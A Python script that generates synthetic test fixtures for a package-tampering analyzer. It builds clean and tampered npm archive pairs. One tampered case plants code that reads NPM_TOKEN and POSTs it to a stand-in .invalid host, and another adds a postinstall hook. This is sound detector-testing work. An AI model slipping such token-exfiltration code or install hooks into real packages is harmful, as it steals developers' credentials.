#!/usr/bin/env python3
"""Build small package/source tarballs for safe Vajra UI demonstrations."""

from __future__ import annotations

import io
import json
import tarfile
import zipfile
from pathlib import Path


ROOT = Path(__file__).resolve().parents[1] / "test-fixtures" / "package-analysis"


def package_json(name: str, version: str = "1.0.0", scripts: dict | None = None) -> str:
    manifest = {
        "name": name,
        "version": version,
        "description": "Synthetic Vajra package-analysis fixture; do not publish.",
        "main": "index.js",
        "files": ["index.js", "README.md"],
    }
    if scripts:
        manifest["scripts"] = scripts
    return json.dumps(manifest, indent=2) + "\n"


def write_tgz(path: Path, files: dict[str, str], archive_root: str = "") -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    with tarfile.open(path, "w:gz", format=tarfile.PAX_FORMAT) as archive:
        for relative_path, content in sorted(files.items()):
            data = content.encode("utf-8")
            info = tarfile.TarInfo(
                f"{archive_root}/{relative_path}" if archive_root else relative_path
            )
            info.size = len(data)
            info.mode = 0o644
            info.uid = 0
            info.gid = 0
            info.uname = ""
            info.gname = ""
            info.mtime = 0
            archive.addfile(info, io.BytesIO(data))


def create_case(
    case_id: str,
    expected: str,
    details: str,
    source: dict[str, str],
    published: dict[str, str],
) -> None:
    case_dir = ROOT / case_id
    case_dir.mkdir(parents=True, exist_ok=True)
    write_tgz(case_dir / "source.tgz", source)
    write_tgz(case_dir / "package.tgz", published, "package")
    (case_dir / "case.json").write_text(
        json.dumps(
            {
                "case": case_id,
                "expected": expected,
                "details": details,
                "packageArchive": "package.tgz",
                "sourceArchive": "source.tgz",
                "safeToInstall": False,
            },
            indent=2,
        )
        + "\n",
        encoding="utf-8",
    )


def main() -> None:
    ROOT.mkdir(parents=True, exist_ok=True)

    clean_math = {
        "package.json": package_json("vajra-clean-math"),
        "README.md": "# Vajra clean math fixture\nSynthetic control package.\n",
        "index.js": "export function add(a, b) { return a + b; }\n",
    }
    create_case(
        "clean-math",
        "No suspicious changes",
        "Published files exactly match the source snapshot.",
        clean_math,
        clean_math,
    )

    clean_text = {
        "package.json": package_json("vajra-clean-text"),
        "README.md": "# Vajra clean text fixture\nSynthetic control package.\n",
        "index.js": (
            "export function titleCase(value) {\n"
            "  return value.replace(/\\b\\w/g, (letter) => letter.toUpperCase());\n"
            "}\n"
        ),
    }
    create_case(
        "clean-text",
        "No suspicious changes",
        "A second clean control with matching manifest and code.",
        clean_text,
        clean_text,
    )

    telemetry_source = {
        "package.json": package_json("vajra-tampered-telemetry"),
        "README.md": "# Vajra telemetry fixture\nSynthetic comparison fixture.\n",
        "index.js": "export function summarize(items) { return items.length; }\n",
    }
    telemetry_package = {
        **telemetry_source,
        "lib/telemetry.js": (
            "const endpoint = \"https://collector.example.invalid/\";\n"
            "export function sendTelemetry(payload) {\n"
            "  return fetch(endpoint, { method: \"POST\", body: JSON.stringify(payload) });\n"
            "}\n"
        ),
    }
    create_case(
        "tampered-added-telemetry",
        "Potential tampering detected",
        "Adds package-only executable code with an outbound request to the reserved .invalid domain.",
        telemetry_source,
        telemetry_package,
    )

    lifecycle_source = {
        "package.json": package_json("vajra-tampered-lifecycle"),
        "README.md": "# Vajra lifecycle fixture\nSynthetic comparison fixture.\n",
        "index.js": "export const version = \"1.0.0\";\n",
    }
    lifecycle_manifest_data = json.loads(
        package_json(
            "vajra-tampered-lifecycle", scripts={"postinstall": "node install.js"}
        )
    )
    lifecycle_manifest_data["files"] = ["index.js", "README.md", "install.js"]
    lifecycle_manifest = json.dumps(lifecycle_manifest_data, indent=2) + "\n"
    lifecycle_package = {
        **lifecycle_source,
        "package.json": lifecycle_manifest,
        "install.js": 'console.log("Synthetic fixture install hook; no changes made.");\n',
    }
    create_case(
        "tampered-lifecycle-hook",
        "Potential tampering detected",
        "Adds a postinstall hook and a harmless marker script. Do not install the archive.",
        lifecycle_source,
        lifecycle_package,
    )

    env_source = {
        "package.json": package_json("vajra-tampered-env"),
        "README.md": "# Vajra environment fixture\nSynthetic comparison fixture.\n",
        "index.js": "export function greet(name) { return `Hello, ${name}`; }\n",
    }
    env_package = {
        **env_source,
        "index.js": (
            "export function greet(name) {\n"
            "  const token = process.env.NPM_TOKEN;\n"
            "  if (token) fetch(\"https://collector.example.invalid/\", {\n"
            "    method: \"POST\", body: JSON.stringify({ token, name }),\n"
            "  });\n"
            "  return `Hello, ${name}`;\n"
            "}\n"
        ),
    }
    create_case(
        "tampered-env-network",
        "Potential tampering detected",
        "Adds a static signal that reads an environment token and sends it to a reserved .invalid domain; the code is never executed.",
        env_source,
        env_package,
    )

    (ROOT / "README.md").write_text(
        """# Vajra package analysis fixtures

Five small synthetic archive pairs for exercising the upload workflow. Each case contains:

- `package.tgz`: the published package archive (files are under the normal `package/` prefix).
- `source.tgz`: the source snapshot archive (files are at its root).
- `case.json`: expected result and a short description.

## Run a case in Vajra

1. Choose **Upload Package Archive (.tgz)** and select that case's `package.tgz`.
2. Choose **Upload Source Archive** and select the same case's `source.tgz`.
3. Run the analysis and compare the result with `case.json`.

The three tampered cases contain planted static signals only. Their outbound destination uses the reserved `.invalid` domain; no network call is made during analysis. The lifecycle example is harmless, but do not install any fixture archive. Vajra inspects archives without extracting or executing their contents.

These are synthetic checks for expected rule behavior, not real malware, an accuracy benchmark, or proof that a package is safe.
""",
        encoding="utf-8",
    )

    bundle = ROOT.parent / "vajra-package-analysis-fixtures.zip"
    with zipfile.ZipFile(bundle, "w", compression=zipfile.ZIP_DEFLATED) as archive:
        for path in sorted(ROOT.rglob("*")):
            if path.is_file():
                archive.write(path, path.relative_to(ROOT.parent))

    print(f"Created five package/source pairs in {ROOT}")
    print(f"Created convenient bundle at {bundle}")


if __name__ == "__main__":
    main()
